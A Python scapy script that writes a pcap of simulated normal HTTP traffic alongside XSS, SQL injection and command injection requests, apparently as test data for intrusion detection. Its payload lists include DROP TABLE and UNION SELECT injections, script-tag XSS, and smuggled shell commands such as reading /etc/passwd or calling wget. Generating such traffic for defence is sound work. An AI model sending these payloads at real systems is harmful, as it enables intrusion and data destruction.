from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTP, HTTPRequest
from scapy.packet import Raw
import random
import warnings
import os
from scapy.layers.l2 import Ether


# Suppress all warnings by redirecting to os.devnull
class NullHandler:
    def write(self, message):
        pass

# Redirect warnings to null
warnings.simplefilter("ignore")
warnings.showwarning = NullHandler().write


def generate_normal_traffic(pcap_file, count=50):
    """Simulate normal HTTP GET traffic."""
    packets = []
    for _ in range(count):
        pkt = (Ether(src="00:11:22:33:44:55", dst="66:77:88:99:AA:BB") /  # Fixed MAC addresses
               IP(src=f"192.168.1.{random.randint(2, 254)}", dst="127.0.0.1") /
               TCP(sport=random.randint(1024, 65535), dport=80, flags='S') /
               HTTP() / HTTPRequest(
                   Method=b"GET",
                   Path=b"/index.html",
                   Host=b"example.com"
               ))
        packets.append(pkt)
    wrpcap(pcap_file, packets, append=True)
    print(f"{count} Normal traffic packets generated and saved.")

def generate_xss_attack(pcap_file, count=50):
    """Simulate XSS attack with variations."""
    packets = []
    xss_payloads = [
        b"username=<script>alert('XSS')</script>&password=test",
        b"username=<img src=x onerror=alert('XSS')>&password=test",
        b"username=<svg/onload=alert('XSS')>&password=test",
        b"username=<body onload=alert('XSS')>&password=test",
        b"username=<iframe src='javascript:alert(1)'></iframe>&password=test"
    ]
    for _ in range(count):
        xss_payload = random.choice(xss_payloads)
        pkt = (Ether() /
               IP(src=f"192.168.1.{random.randint(2, 254)}", dst="127.0.0.1") /
               TCP(sport=random.randint(1024, 65535), dport=80) /
               Raw(load=xss_payload))
        packets.append(pkt)
    wrpcap(pcap_file, packets, append=True)
    print(f"{count} XSS attack packets generated and saved.")

def generate_sql_injection(pcap_file, count=50):
    """Simulate SQL Injection attack with variations."""
    packets = []
    sql_payloads = [
        b"username=admin' OR 1=1 --&password=dummy",
        b"username=admin' UNION SELECT * FROM users --&password=dummy",
        b"username=admin' AND 1=1 --&password=dummy",
        b"username=admin' OR 'x'='x' --&password=dummy",
        b"username=admin' DROP TABLE users; --&password=dummy",
        b"username=admin' AND (SELECT COUNT(*) FROM users) > 0 --&password=dummy",
        b"username=admin' OR EXISTS(SELECT * FROM users) --&password=dummy"
    ]
    sql_payloads.extend([
        b"username=admin'/**/OR/**/1=1 --&password=dummy",
        b"username=admin' AND '1'='1' --&password=test",
    ])

    xss_payloads.extend([
        b"username=<scr&#x69;pt>alert('XSS')</scr&#x69;pt>&password=test",
        b"username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E&password=test",
    ])

    cmd_payloads = [
        b"username=admin&password=; curl example.com",
        b"username=admin&password=; ls${IFS}-la",
        b"username=admin&password=; cat /etc/passwd",
        b"username=admin&password=| wget example.com",
        b"username=admin&password=&& whoami"
    ]


    for _ in range(count):
        sql_payload = random.choice(sql_payloads)
        pkt = (Ether() /
               IP(src=f"192.168.1.{random.randint(2, 254)}", dst="127.0.0.1") /
               TCP(sport=random.randint(1024, 65535), dport=80) /
               Raw(load=sql_payload))
        packets.append(pkt)
    wrpcap(pcap_file, packets, append=True)
    print(f"{count} SQL Injection packets generated and saved.")

def generate_cmd_injection(pcap_file, count=50):
    """Simulate Command Injection attack."""
    packets = []
    cmd_payload = b"username=admin&password=; ls -la"
    for _ in range(count):
        pkt = (Ether() /
               IP(src=f"192.168.1.{random.randint(2, 254)}", dst="192.168.1.10") /
               TCP(sport=random.randint(1024, 65535), dport=80, flags='PA') /
               HTTP() / HTTPRequest(
                   Method=b"POST",
                   Path=b"/cmd_exec",
                   Host=b"vulnerable-site.com",
                   Content_Length=str(len(cmd_payload)).encode(),
                   Content_Type=b"application/x-www-form-urlencoded"
               ) / Raw(load=cmd_payload))
        packets.append(pkt)
    wrpcap(pcap_file, packets, append=True)
    print(f"{count} Command Injection packets generated and saved.")

def main():
    os.makedirs("pcaps", exist_ok= True)
    pcap_file = "pcaps/simulated_attack_traffic.pcap"
    
    # Generate different types of traffic
    generate_normal_traffic(pcap_file, count=50)
    generate_xss_attack(pcap_file, count=50)
    generate_sql_injection(pcap_file, count=50)
    generate_cmd_injection(pcap_file, count=50)

# SQL Injection Payloads
sql_payloads = [
    b"username=admin' OR 1=1 --&password=dummy",
    b"username=admin' UNION SELECT * FROM users --&password=dummy",
    b"username=admin' AND 1=1 --&password=dummy",
    b"username=admin' OR 'x'='x' --&password=dummy",
    b"username=admin' DROP TABLE users; --&password=dummy",
]

sql_payloads.extend([
    b"username=admin' AND 1=1 --",
    b"username=' OR 'a'='a' --",
    b"username=admin' UNION SELECT NULL, username, password FROM users --",
    b"username=admin'; DROP TABLE users; --",
    b"username=admin' AND LENGTH(password) > 8 --",
])

# XSS Attack Payloads
xss_payloads = [
    b"username=<script>alert('XSS')</script>&password=test",
    b"username=<img src=x onerror=alert('XSS')>&password=test",
    b"username=<svg/onload=alert('XSS')>&password=test",
    b"username=<body onload=alert('XSS')>&password=test",
    b"username=<iframe src='javascript:alert(1)'></iframe>&password=test",
]

xss_payloads.extend([
    b"<script>alert('XSS')</script>",
    b"<img src='x' onerror='alert(1)'>",
    b"<svg onload=alert(1)>",
    b"<body onload='alert(1)'>",
    b"<iframe src='javascript:alert(1)'></iframe>",
    b"<div onmouseover='alert(1)'>Hover me</div>",
])

sql_payloads.extend([
    b"username=admin'/**/OR/**/1=1 --&password=dummy",
    b"username=admin' AND 1=1 --",
    b"username=' OR 'a'='a' --",
    b"username=admin%27%20OR%201%3D1%20--&password=dummy"  # URL-encoded
])

xss_payloads.extend([
    b"username=<scr&#x69;pt>alert('XSS')</scr&#x69;pt>&password=test",
    b"username=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E&password=test",  # Encoded
    b"username=<svg/onload=alert(String.fromCharCode(88,83,83))>&password=test"
])


if __name__ == "__main__":
    main()
